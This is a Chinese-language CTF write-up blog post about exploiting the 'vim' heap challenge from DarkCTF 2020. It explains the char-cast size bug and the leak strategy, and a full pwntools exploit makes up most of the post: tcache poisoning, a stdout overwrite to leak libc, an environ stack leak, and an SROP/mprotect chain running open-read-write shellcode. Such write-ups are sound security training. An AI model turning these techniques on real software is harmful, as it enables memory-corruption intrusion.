---
layout:     post
title:      2020 darkctf pwn writeup
excerpt:    darkctf两个pwn题, 不是很难
date:       2020-08-16
author:     wxk1997
header-img: img/pwn-bg.png
catalog: true
tags:
    - ctf
    - pwn
categories:
    - writeup
---

# 前言

感觉好久没打比赛了, 今天正好没啥事儿, 上opentoall 的 slack看了一下发现正好有个比赛, 就做了一下. 一共就四道pwn题, 我看的时候只剩两道了. 第一题funkypointers很简单, 改一下函数指针然后调用后门函数就好了. 第二题vim有点难度, 花了大概三个小时才写出了吧, 太久没做题都有点生疏了. 在此记录一下.

# 正文

# funkypointers

略

## vim

题目保护全开, 还用`seccomp`开了沙箱:

```
 line  CODE  JT   JF      K
=================================
0000: 0x20 0x00 0x00 0x00000004  A = arch
0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
0002: 0x06 0x00 0x00 0x00000000  return KILL
0003: 0x20 0x00 0x00 0x00000000  A = sys_number
0004: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0006
0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
0006: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0008
0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
0008: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0010
0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
0010: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0012
0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
0012: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0014
0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
0014: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0016
0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
0016: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0018
0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
0018: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0020
0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
0020: 0x06 0x00 0x00 0x00000000  return KILL
```

题目只有 `malloc` 和 `free` 两个功能. 在`add`功能中有漏洞:

```c
printf("Enter the size of the chunk: ", v1);
v3 = get_ll();
if ( (char)v3 <= 0x78 ){
    g_ptrs[v2] = malloc((char)v3);              // heap overflow
    printf("Enter note: ");
    get_str((void *)g_ptrs[v2], v3);
}
```

`size` 传给 `malloc`  的时候被转成了 `char`, 但是读取输入的时候用的是 `unsigned int`. 所以存在栈溢出漏洞.

程序有两个限制:

- `malloc`的size要小于等于 0x78, 
- 最多同时只能存在5个chunk.

题目给了libc, 版本是 2.27.

利用思路很清晰:

1. 利用溢出在堆上构造一个 `unsorted bin` 地址
2. 覆盖 `unsorted bin` 地址低两字节使其指向`stdout`
3. 覆盖 `stdout` 的 `write_base` 的低字节为 `\x00` 从而leak libc 地址
4. 利用 libc 中的 `environ` leak 栈地址
5. 在栈上构造rop链和 orw 的 shellcode. rop 思路如下:
   1. 先跳到 `mprotect`  让栈可执行
   2. 执行 `orw` shellcode 拿到flag

exp 如下:

```python
from pwn import *
from time import sleep
import sys

global io

context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

filename = "./vim"
ip = ""
port = 

LOCAL = True if len(sys.argv)==1 else False


# elf = ELF(filename)

remote_libc = "./libc.so.6"
if LOCAL:

    io = process(filename, env={'LD_PRELOAD': remote_libc}) 
    libc = ELF(remote_libc)
else:
    context.log_level = 'debug'
    io = remote(ip, port)
    libc = ELF(remote_libc)



def choice( idx):
    io.sendlineafter( "Choice: ", str(idx))
    
def lg(name, val):
    log.info(name+" : "+hex(val))

def add( size, data):
    choice( 1)
    io.sendlineafter( " size of the chunk: ", str(size))
    io.sendafter( "Enter note: ", data)

def rm( idx):
    choice( 2)
    io.sendlineafter( "Enter chunk index: ", str(idx))

def set( data):
    choice( 0x1337)


# construct double free

add( 0x18, 'wwww')
add( 0x28, 'xxxx')
add( 0x28, 'kkkk')

rm( 2)
rm( 1)
rm( 0)
add( 0x118, flat('a'*0x18, 0x31) + "\x80")

add( 0x28, '\x80')
add( 0x28, '\x80')

# use unsorted bin to get  libc address

rm( 0)
add( 0x518, flat('a'*0x18, 0x421, 'a'*0x410, 0, 0x21, 0, 0, 0, 0x21))

rm( 1)

# partial overwrite unsorted bin's address to make it points to stdout

# need to bruteforce 4 bits

rm( 0)
add( 0x118, flat('a'*0x18, 0x31) + "\x1d\x37")

# overwrite last byte of stdout->write_base to \x00

# the we can get libc address

add( 0x28, 'a')
add( 0x128, flat('a'*(67 -8), 0X41, 0xfbad1800, 0, 0, 0) + '\0')

io.recv( 8)

libc_addr = u64(io.recv( 6) + '\0\0')
lg('libc_addr', libc_addr)
libc.address = libc_addr - 0x3ed8b0 # remote libc

lg("libc base", libc.address)

stdout_addr = libc.symbols['_IO_2_1_stdout_']

# use environ in libc to leak stack address

environ_addr = libc.sym['environ']
lg("environ", environ_addr)
rm( 0)
add( 0x118,  flat('a'*0x18, 0x51))
rm( 1)
rm( 0)
add( 0x118,  flat('a'*0x18, 0x51, stdout_addr))

add( 0x48, 'a')

add( 0x148, flat(0xfbad1800, 0, 0, 0, environ_addr, environ_addr+8))

stack_addr = u64(io.recv( 8))
lg("stack address", stack_addr)

read_ret_stack = stack_addr - 384 # local and remote are same


rm( 4)

rm( 0)
add( 0x118,  flat('a'*0x18, 0x61))
rm( 1)
rm( 0)
add( 0x118,  flat('a'*0x18, 0x61, read_ret_stack))
add( 0x58, 'a')

# construct  rop chain

# call mprotect(read_ret_stack & ~0xfff, 0x100, 7) first

# then run the orw shellcode

sc53 = libc.symbols['setcontext'] + 53

PrdiR = libc.address + 0x000000000002155f # remote libc


frame = SigreturnFrame()
frame.rsp = read_ret_stack + 0x18
frame.rdi = (read_ret_stack) & ~0xfff
frame.rsi = 0x1000
frame.rdx = 7
frame.rip = libc.symbols['mprotect']


sc = shellcraft.open("/home/ctf/flag", 0)
sc += shellcraft.read(3, read_ret_stack-0x100, 0x40)
sc += shellcraft.write(1, read_ret_stack-0x100, 0x40)

sc = asm(sc)

add( 0x258,  flat(
        PrdiR, read_ret_stack + 0x28,
        sc53, 
        read_ret_stack + 0x180, 0,
        str(frame)
    ).ljust(0x180, '\0') + sc
)

io.interactive()

```

# 结语

vim这题算是比较常规的堆题, 虽然做的慢了点, 但是好在还是做出来了. 之后几天有个 Google CTF, 也可以玩一玩.

# 参考

1. [setcontext扩大控制流](file:///C:/Users/wxk/Zotero/storage/9UYFT4GS/993.html)
2. [srop小记](https://ray-cp.github.io/archivers/srop-analysis)

